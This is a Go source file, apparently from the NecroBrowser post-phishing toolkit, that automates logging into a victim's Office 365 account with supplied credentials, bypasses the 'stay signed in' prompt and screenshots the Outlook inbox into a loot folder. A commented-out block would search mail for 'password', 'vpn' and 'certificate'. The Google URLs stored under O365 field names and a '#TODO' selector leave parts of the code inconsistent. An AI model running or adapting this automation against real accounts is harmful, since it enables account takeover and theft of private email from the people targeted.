package o365

import (
	"context"
	"github.com/muraenateam/necrobrowser/action/click"
	"github.com/muraenateam/necrobrowser/action/screenshot"

	"github.com/muraenateam/necrobrowser/action"
	"github.com/muraenateam/necrobrowser/action/login"
	//"github.com/muraenateam/necrobrowser/action/screenshot"
	"github.com/muraenateam/necrobrowser/log"
	"github.com/muraenateam/necrobrowser/zombie"
)

const (
	// Name of this zombie
	Name = "O365"
)

type O365 struct {
	zombie.Target

	MyAccount         string
	O365Url           string
	OneDriveUrl       string
	O365Search        string
	SearchForKeywords []string
}

type Extrusion struct {
	zombie.Extrusion
}

func NewO365(target zombie.Target) *O365 {

	target.Tag = zombie.GetTag(Name)
	return &O365{
		Target:            target,
		MyAccount:         "https://myaccount.google.com/personal-info",
		O365Url:           "https://mail.google.com/mail/#inbox",
		OneDriveUrl:       "https://drive.google.com/drive/my-drive",
		O365Search:        "https://mail.google.com/mail/u/0/#search/",
		SearchForKeywords: []string{"password", "vpn", "certificate"},
	}
}

// Name returns the action name
func (z *O365) Name() string {
	return Name
}

// SetLootPath updates the zombie target object
func (z *O365) SetLootPath(lp string) {
	z.Target.LootPath = lp
}

// SetContext updates the zombie context object
func (z *O365) SetContext(c context.Context) {
	z.Target.Context = c
}

// Instrument instructs the chrome context to perform operations on the defined target
func (z *O365) Instrument() (interface{}, error) {
	var err error

	a := action.Action{Target: z.Target}
	z.Info("Instrumenting O365 accounts")

	loginAutomation := &login.Login{
		Action:           a,
		URL:              "https://login.microsoftonline.com",
		Username:         z.Target.Username,
		UsernameSelector: `input[name='loginfmt']`,
		Password:         z.Target.Password,
		PasswordSelector: `input[name='passwd']`,
	}
	if err = loginAutomation.Do(); err != nil {
		log.Error("Error performing login: %v", err)
		return nil, err
	}

	z.Info("Login in office365 as %s OK", z.Target.Username)

	skipStaySignedIn := click.Click{
		Action:   a,
		Selector: "#idBtn_Back",
	}

	if err = skipStaySignedIn.Click(); err != nil {
		log.Error("Error clicking on Skip staying signed in: %v", err)
		return nil, err
	}

	s := &screenshot.Screenshot{
		Action:   a,
		URL:      "https://outlook.office365.com/owa/",
		Selector: `#TODO`,
	}
	s.Target = z.Target
	if err = s.Take(); err != nil {
		log.Error("Error taking screenshot: %v", err)
	}

	//z.Debug("Extracting o365 data information")
	//
	//
	//// search for defined keywords
	//for _, keyword := range z.SearchForKeywords {
	//
	//	emails := z.dumpEmailByKeyword(keyword)
	//	if emails != "" {
	//		log.Info("[%s] eMails \n %s", tui.Bold(tui.Green(keyword)), emails)
	//	}
	//}

	return "", nil
}
